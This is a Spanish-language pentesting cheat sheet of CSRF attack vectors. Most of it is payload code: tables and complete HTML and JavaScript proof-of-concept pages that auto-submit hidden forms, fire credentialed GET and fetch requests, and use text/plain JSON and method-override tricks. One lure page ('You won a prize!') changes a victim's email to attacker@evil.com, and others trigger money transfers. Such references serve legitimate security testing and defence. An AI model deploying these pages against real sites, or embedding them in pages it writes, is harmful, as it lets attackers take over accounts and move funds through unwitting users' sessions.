---
aliases:
  - CSRF Attack Vectors
  - CSRF PoC
  - CSRF Payloads
tags:
  - type/cheatsheet
  - vuln/csrf
  - technique/initial-access
  - technique/execution
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Cross-Site Request Forgery (CSRF)]]'
---
# CSRF - Vectores de Ataque

***

## HTML Form Auto-Submit (POST)

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Form clásico POST | `<form action="https://target/profile" method="POST"><input name="email" value="evil@attacker.com"></form><script>document.forms[0].submit()</script>` | Auto-submit con JS. |
| Sin JavaScript | `<body onload="document.forms[0].submit()"><form action="..." method="POST">...</form></body>` | Funcional con JS deshabilitado parcial. |
| Multipart form-data | `<form action="..." method="POST" enctype="multipart/form-data">...</form>` | Para upload o avoid Content-Type checks. |
| Form con múltiples inputs | `<input name="field1" value="..."><input name="field2" value="...">` | Replicar form completo. |
| Form invisible | `<form style="display:none">...</form>` | UX silencioso. |
| Iframe con form | `<iframe src="malicious.html" style="display:none"></iframe>` | Embed PoC en otro sitio. |
| Form con action en target | `action="https://target.com/admin/delete"` | URL completa al target. |
| Submit con button click | `<button type="submit">Click here</button>` | Para social engineering visible. |
| Form en email HTML | Algunos clients permiten — peligroso | Outlook, Thunderbird. |
| Force fixed value | `value="atacante@evil.com"` | Resultado determinístico. |
^csrf-vector-form

### PoC HTML completo

```html
<!DOCTYPE html>
<html>
<body>
  <h1>You won a prize! Click below.</h1>
  <form id="csrf" action="https://target.com/profile/email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="confirm" value="1">
  </form>
  <script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

___

## Image / Link (GET-based)

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Image src GET | `<img src="https://target/api/delete?id=42">` | Fires GET inmediato sin user click. |
| Hidden image | `<img src="..." style="display:none" width="0" height="0">` | Stealth. |
| Link href | `<a href="https://target/transfer?to=attacker&amount=1000">Click</a>` | Requiere click. |
| Link auto-click | `<script>location.href='https://target/...'</script>` | Top-level nav — pasa SameSite=Lax. |
| Background image CSS | `<style>body{background:url(https://target/api/...)}</style>` | Igual que img. |
| `<link rel>` | `<link rel="stylesheet" href="https://target/api/...">` | GET via stylesheet load. |
| `<script src>` | `<script src="https://target/api/..."></script>` | GET via script load. |
| `<video src>` / `<audio src>` | Same as img | Otros tags con GET. |
| `<iframe src>` | `<iframe src="https://target/api/...">` | GET en frame. |
| Meta refresh | `<meta http-equiv="refresh" content="0;url=https://target/...">` | Top-level navigation. |
| Auto-fetch via JS | `fetch('https://target/api/...')` | Sin CORS — pero credentials no enviadas por default. |
| Beacon API | `navigator.sendBeacon('https://target/...')` | Async, no response. |
^csrf-vector-image

### CSRF GET-based PoC

```html
<!-- Attack en página atacante visitada por victim -->
<img src="https://target.com/api/transfer?to=attacker&amount=1000" style="display:none">
```

Si endpoint POST está marcado pero acepta GET → `<img>` ejecuta. Anti-pattern común.

___

## JavaScript fetch / XHR

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| fetch básico con cookies | `fetch('https://target/api/x', {method:'POST', credentials:'include', body:'...', headers:{...}})` | `credentials:'include'` envía cookies. |
| XHR clásico | `var x=new XMLHttpRequest(); x.open('POST','...'); x.withCredentials=true; x.send(body);` | Pre-fetch API. |
| fetch con JSON | `fetch('...', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body:JSON.stringify({...})})` | Application/json — preflight required. |
| fetch sin preflight (simple request) | `Content-Type: application/x-www-form-urlencoded` o `text/plain` o `multipart/form-data` | Bypass de CORS preflight. |
| fetch con custom header | `headers:{'X-Custom':'x'}` → triggers preflight | Limitación. |
| Background fetch | `fetch('...', {keepalive:true})` | Survives page unload. |
| Sendbeacon | `navigator.sendBeacon(url, body)` | Body como string/Blob/FormData. |
| Form-encoded body via fetch | `body:new URLSearchParams({k:'v'})` | Sin preflight. |
| Multipart body via fetch | `body:new FormData(form)` | Sin preflight. |
| WebSocket "fetch" | `new WebSocket('wss://target/...')` | CSWSH vector. |
^csrf-vector-fetch

### fetch sin preflight (CORS simple request)

```javascript
fetch('https://target.com/api/transfer', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'  // simple request
  },
  body: 'to=attacker&amount=1000'
});
```

Sin preflight OPTIONS → backend recibe POST con cookies. Si no hay token CSRF check → success.

___

## JSON / Multipart Content-Type Bypass

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| API espera JSON pero acepta form | Form con `Content-Type: application/x-www-form-urlencoded` y body que parsea como JSON | Si lib hace fallback a form parser. |
| API JSON con form body | `<form enctype="text/plain"><input name='{"key":"val","_":' value='_"}'>` | Trick CSRF JSON via form `text/plain`. |
| Trick text/plain JSON | `<form enctype="text/plain" action="https://target/api"><input name='{"action":"delete","_":' value='_"}'></form>` | Form genera `{"action":"delete","_":=_"}` body — JSON válido. |
| API XML con form | Igual concept — aceptar `application/xml` con form-encoded data | Edge case. |
| API que acepta múltiples Content-Types | `Content-Type: application/json` rejected, pero `text/plain` con JSON adentro acepta | Sniffing-based parser. |
| Multipart con custom boundary | `<form enctype="multipart/form-data">...</form>` | Para uploads — no requiere preflight. |
| Method override via header | `X-HTTP-Method-Override: PUT` con form POST | Backend convierte. |
| Method override via body | `_method=PUT` campo hidden | Rails / Symfony default behavior. |
| Method override via query | `?_method=DELETE` | Igual. |
| API REST con JSON-only | Si API requiere `Content-Type: application/json` strict y app no acepta otros | Más resistente. |
^csrf-vector-json

### CSRF JSON via text/plain trick

```html
<!DOCTYPE html>
<html>
<body>
  <form action="https://api.target.com/v1/users/me" method="POST" enctype="text/plain">
    <input name='{"email":"attacker@evil.com","_dummy":"' value='"}'>
  </form>
  <script>document.forms[0].submit()</script>
</body>
</html>
```

Browser envía body literal: `{"email":"attacker@evil.com","_dummy":"=" }`. Backend que parsea JSON con tolerancia → procesa el email change.

***
